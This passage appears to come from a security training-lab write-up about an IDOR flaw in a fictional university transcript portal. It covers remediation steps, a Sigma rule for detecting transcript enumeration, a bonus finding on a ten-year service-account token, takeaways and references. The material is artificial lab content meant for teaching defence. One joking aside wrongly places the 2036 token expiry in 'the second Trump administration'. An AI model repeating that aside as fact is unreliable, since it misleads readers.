- **Oso** (<https://www.osohq.com/>): authorization framework based on the Polar DSL with RBAC, ReBAC, and ABAC support. (Oso's company positioning shifted toward AI-agent authorization in 2025, but the application-authorization product remains available; the Polar-based library is the relevant piece for IDOR remediation.)
- **Framework-native primitives**: Django's `permission_required` decorators, Rails' Pundit / CanCanCan, Spring Security's `@PreAuthorize`, .NET's `[Authorize]` attributes with policy handlers.

The selection criterion isn't the tool; it's the discipline of "every protected resource gets evaluated through the same policy entry point" rather than "every developer remembers to add the check."

### 3. Replace predictable IDs with unguessable ones

Meridian's `M-187xxxx` sequential format makes enumeration trivial. UUIDs (specifically UUIDv4 random or ULID lexicographically-sortable) eliminate the enumerate-the-keyspace attack vector. *This is not a fix for IDOR*, the authz check is still the fix, but it's a meaningful defense-in-depth layer.

The retrofit pattern: introduce a UUID alongside the existing M-XXXXXXX identifier; update the API to accept either (with a deprecation timeline for the M-XXXXXXX form); update the database schema to make the UUID the primary key; eventually deprecate the M- form for API use.

### 4. Audit the entire codebase for sibling patterns

The pattern "endpoint takes ID as input, looks up record, returns record" repeats many times in any application of size. Each instance needs the authz check. Tools that find this fast:

- **Semgrep registry** (<https://semgrep.dev/r/>): community-maintained static analysis rules. Search for `idor`, `bola`, `authorization`, multiple rule packs available for Express, FastAPI, Django, Rails, Spring, ASP.NET.
- **CodeQL** (<https://codeql.github.com/>): GitHub's semantic code analysis. The default query suites for JavaScript / Python / Java include IDOR-class patterns.
- **Burp Suite Pro** (commercial): the *Authorize* extension performs per-request authorization testing during a regular Burp scan.[^burp-suite-authorize-extension] Pairs well with manual testing of newly-discovered endpoints.

### 5. Decommission the BluePier demo account

The advisor_notes credential is the immediate fix (rotate the value), but the demo account itself should go away. Migrations strategy:

1. Rotate the `meridian-portal-svc-2026` credential immediately.
2. Identify any active consumers of the demo account (the "automated nightly check" James referenced in the notes, does it still run?).
3. If consumers exist, replace them with proper service-account infrastructure (a real service account in the SSO provider, not a fake student record).
4. Disable the demo account.
5. After a 30-day soak window, delete the demo account.
6. Audit the schema for any other `M-000xxxx` system accounts that exist. Each one needs the same treatment.

### 6. Schema-level constraints on free-form fields

The `advisor_notes` field is a free-form text field. It will, eventually, contain something it shouldn't. The defensive postures:

- **Content scanning**: gitleaks / trufflehog-style regex scanners run against database dumps periodically catch credentials, API keys, and tokens in text fields.
- **Field-level access control**: PostgreSQL Row-Level Security (RLS), MySQL views with column-level grants, MongoDB field-level redaction, these enforce that `advisor_notes` is only readable by callers with the right role.
- **DLP (Data Loss Prevention) on the API egress**: scan outgoing API responses for credential patterns. Block or alert. AWS Macie / Microsoft Purview / Google DLP API all do this.

### 7. SIEM detection for cross-user access patterns

The detection that would have caught Carlos's bug in production: "for each request to `/api/transcript`, log `(session.studentId, query.student_id, match)`. Alert on any row where `match=false` from a non-registrar role." The telemetry needed is trivial; the alert is high-signal because, post-remediation, the only legitimate non-match should be registrar staff. Splunk, Sentinel, Elastic, Datadog, all support this kind of correlation rule.

### 8. The long-term posture: defense in depth

Assume the application-level authz check will, at some point, be missing. Belt-and-suspenders the back end:

- **Row-Level Security at the database**: PostgreSQL's RLS lets you write policies on the `transcripts` table that filter `SELECT` results based on the connected database user. Even if the application skips the check, the database returns zero rows for queries that don't match the connected role's identity.
- **API Gateway authorization policies**: gateways like Kong, Apigee, AWS API Gateway, Azure API Management let you attach JWT-claim-based policies that fire before the request reaches the application. Per-route policies that compare URL parameters to JWT claims add a layer in front of the application.
- **Service mesh authorization**: in a Kubernetes environment, Istio / Linkerd authorization policies can enforce per-route claims-matching at the mesh layer.

The principle: any single layer that can be bypassed by a missing check (the application authz, the database RLS, the gateway policy) is meaningfully harder to bypass when all three are present.

### Sample detection rule (Sigma)

Every request in this attack is authenticated and well-formed, so no
single request is anomalous. The signal is in the aggregate: one session
retrieving many different students' transcripts.

```yaml
title: Single session retrieving transcripts for many distinct students
status: experimental
description: >
  Detects horizontal enumeration of an object-id parameter. The endpoint
  authenticates correctly and authorises nothing, so individual requests
  are indistinguishable from legitimate use and only the distribution of
  requested ids separates a student from a scraper.
logsource:
  category: webserver
detection:
  transcript_fetch:
    cs-uri-stem|contains: '/transcript/download'
    sc-status: 200
  timeframe: 10m
  condition: transcript_fetch | count(distinct(student_id)) by session_id > 5
falsepositives:
  - Registrar and advising staff, who legitimately access many students'
    records. Exclude by role rather than by account, and revisit whenever
    the role membership changes.
  - Automated report generation and accreditation exports, which should
    run under a service identity rather than a staff session.
level: high
```

The aggregation syntax is Sigma's correlation form and needs a backend
that supports it. Splunk, Elastic, and Sentinel all do; a simple
regex-matching pipeline does not, which is worth confirming before this
rule is promised in a remediation plan.

Choosing a threshold is a judgement call and should be documented as one.
Five distinct students in ten minutes is a starting point derived from
what a normal student session looks like, not a standard. Tune it against
a week of real traffic, and expect the registrar exclusion to matter more
than the number.

None of this is the fix. An authorisation check comparing the requested
`student_id` against the session's own identity makes the enumeration
impossible, and the detection is only covering the interval until that
ships.

## §7.5 — Optional exploration

The credential chain works without this section. The level seeds one hidden bonus find that fires if you happen to run a particular command, `progress --detail` lists what you've unlocked.

### The ten-year service-account session

**Trigger:** `cat session.txt` (you ran this as step 3 of the solve, so the bonus fires there)

**What it teaches:** session.txt decodes a `MeridianSSO` cookie with `exp:2036-04-09`, a *ten-year* session token, issued for a "nightly health-check job." Long-lived service-account sessions are themselves a finding, separate from the IDOR finding the level scores on.

Rotation is the security property. A one-hour session that's used and renewed by the runtime every hour has a one-hour blast radius if compromised. A one-year session has a one-year blast radius. A ten-year session has *effectively no rotation*, the next token rotation is scheduled for the second Trump administration, which is to say it's not a rotation, it's just a TTL that expires before the engineer who issued it retires.

What Carlos's monitoring job *should* be doing:

- **Fetch-on-startup**: the job uses OAuth client-credentials grant or AWS STS AssumeRole to obtain a short-lived (15-minute, one-hour) token at job invocation time. The token is in memory only, never on disk, never in a `session.txt` file an auditor can read.
- **Token-cache with TTL enforcement**: if the job runs frequently enough that fetching a token every invocation is wasteful, cache the token *with the actual TTL of the upstream provider*, not a synthetic ten-year wrapper around an upstream short-lived token.
- **Audit logs that capture token issuance**: every issuance is a logged event with the principal, the requested scope, and the expiration. A ten-year token would have been visible in the issuance audit log the moment it was minted, *if* anyone was reading the issuance audit log.

The 2024 [Snowflake UNC5537 campaign](https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion) demonstrated the long-TTL service-account session as a real-world primary attack vector at scale: customers whose Snowflake credentials had been exfiltrated years earlier (from compromised personal devices of employees) still had valid sessions in 2024 because nothing had rotated. The MFA-not-enforced surface compounded the problem, but the rotation-not-enforced surface was the root cause.

Carlos's ten-year MeridianSSO token is the same shape, smaller blast radius. Still a finding.

## §8 — Key takeaways

- **Authentication asks "who are you?" Authorization asks "are you allowed to do this?"** Frameworks make the first question easy. The second is yours to answer every time, on every route, for every resource. Carlos answered the first and never asked the second.

- **IDOR and BOLA are among the most-reported bug classes in modern web applications,** not because the technique is clever but because per-resource authorization is per-route work: every new route needs the check, and sooner or later one forgets it. The defensive answer is centralization, a single policy entry point every route passes through, instead of logic scattered across handlers.

- **Unguessable IDs help, and they are not the fix.** UUIDs and ULIDs make enumeration more expensive; they do not replace the authorization check. The check is the fix. The unguessable ID is the defence in depth for the day a check goes missing somewhere, which it will.

- **Free-text fields collect things they shouldn't.** Wherever your schema allows free text (advisor notes, ticket descriptions, profile bios, comments), assume it will eventually contain credentials, tokens and other secrets stashed "temporarily". Content scanning, schema constraints and DLP on egress are the layered defences.

- **"Temporary" accounts outlive their purpose.** BluePier's M-0000001 demo account was due for decommissioning in Q4 2024 and was still live in 2026. Same pattern as the audit-bypass account in `level1@network`, and as plenty of real incidents. A registry, automated deprovisioning and a recertification workflow are the fix.

- **In a FERPA-covered environment**, a transcript IDOR breaches §99.31 and §99.32 in one go, and the federal-funding mechanism turns a confirmed exposure from a compliance line item into a budget risk. Universities should put IDOR and BOLA testing into their annual web-audit scope. Cedarwood Mutual's renewal-driven audit is one model; it should not be the only review in the year.

- **Carlos's mistake is the most common one a capable developer makes.** Adding authentication middleware was easy, and in his head the SSO had already proved who the caller was, so what was left? The conversation that fixes it is a fifteen-second whiteboard sketch: what is left is checking whether *this* user may see *this* record. That turns "I shipped a bug" into "I know what I was missing". The code fix is mundane. Building the habit of catching it before it ships is the harder part.

## §9 — Further reading

*Last reviewed: August 2026, links and version-specific claims (cert exam versions, framework revisions, regulation citation IDs) verified current as of the review date. Standards drift over time; if you're reading this more than 6-12 months past the review date, double-check the cited versions before quoting them in audit work.*

[^department-of-education-privacy-technical]: [Department of Education Privacy Technical Assistance Center (PTAC)](https://studentprivacy.ed.gov/). Notification templates, breach-response guides, FERPA training materials for university administrators.
[^nist-800-171]: [NIST SP 800-171 Rev. 3](https://csrc.nist.gov/pubs/sp/800/171/r3/final). Published May 2024; the current standard for protecting CUI in non-federal systems.
[^nist-800-53]: [NIST SP 800-53 Rev. 5](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final). The federal control catalog. AC family covers access control.
[^cwe-639]: [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html).
[^cwe-862]: [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html).
[^cwe-863]: [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html).
[^cwe-285]: [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html).
[^cwe-312]: [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html).
[^owasp-top-10-2025-a01]: [OWASP Top 10 (2025) — A01: Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/).
[^owasp-api-security-top-10]: [OWASP API Security Top 10 (2023) — API1: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/).
[^owasp-asvs-v5-0-v4]: [OWASP ASVS v5.0 — V4 Access Control](https://owasp.org/www-project-application-security-verification-standard/).
[^krebs-on-security-usps-site]: [Krebs on Security — "USPS Site Exposed Data on 60 Million Users" (Nov 2018)](https://krebsonsecurity.com/2018/11/usps-site-exposed-data-on-60-million-users/). The original USPS Informed Visibility writeup.
[^burp-suite-authorize-extension]: [Burp Suite Authorize extension](https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f).
[^cert-cissp]: [ISC2 CISSP — certification exam outline](https://www.isc2.org/certifications/cissp/cissp-certification-exam-outline).
[^cert-security-plus]: [CompTIA Security+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/security/).
[^cert-cysa]: [CompTIA CySA+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/cybersecurity-analyst/).
[^cert-pentest-plus]: [CompTIA PenTest+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/pentest/).
[^cert-oscp]: [OffSec PEN-200 / OSCP — course syllabus and exam guide](https://www.offsec.com/courses/pen-200/).
[^cert-oswe]: [OffSec WEB-300 / OSWE — course syllabus](https://www.offsec.com/courses/web-300/).
[^cert-gwapt]: [GIAC GWAPT — Web Application Penetration Tester](https://www.giac.org/certifications/web-application-penetration-tester-gwapt).
[^cwe-200]: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
[^cwe-540]: [CWE-540](https://cwe.mitre.org/data/definitions/540.html).
[^nist-800-63b]: [NIST SP 800-63B-4 — Digital Identity Guidelines: Authentication and Authenticator Management](https://csrc.nist.gov/pubs/sp/800/63/b/4/final).
[^optus-oaic-penalty]: [Australian Information Commissioner takes civil penalty action against Optus (OAIC, August 2025)](https://www.oaic.gov.au/news/media-centre/australian-information-commissioner-takes-civil-penalty-action-against-optus). Alleges one contravention for each of roughly 9.5 million individuals, at up to AUD $2.22 million per contravention.
[^tmobile-2023-8k]: [T-Mobile Form 8-K, 19 January 2023 (SEC)](https://www.sec.gov/Archives/edgar/data/1283699/000119312523010949/d641142d8k.htm). The disclosure of the API-abuse incident.

### Further reading

- [FERPA full text — 20 U.S.C. § 1232g](https://www.govinfo.gov/content/pkg/USCODE-2023-title20/html/USCODE-2023-title20-chap31-subchapIII-part4-sec1232g.htm). The statute itself.
- [FERPA implementing regulations — 34 CFR Part 99](https://www.ecfr.gov/current/title-34/subtitle-A/part-99). The operational compliance text. Sections 99.3, 99.31, 99.32, 99.7 are the most cited for IDOR-style disclosure findings.
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/).
- [MITRE ATT&CK T1213 — Data from Information Repositories](https://attack.mitre.org/techniques/T1213/).
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html).
- [OWASP Insecure Direct Object Reference Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html).
- [Open Policy Agent (OPA)](https://www.openpolicyagent.org/).
- [Casbin](https://casbin.apache.org/).
- [Oso](https://www.osohq.com/).
- [HackerOne *Hacker-Powered Security Report* (evergreen landing)](https://www.hackerone.com/report/hacker-powered-security). Industry-wide vulnerability-class frequencies.
- [Semgrep registry](https://semgrep.dev/r/). Search for `idor`, `bola`, `authorization`.
- [CodeQL](https://codeql.github.com/). GitHub-native semantic code analysis with IDOR-aware queries in the default JavaScript, Python, and Java suites.
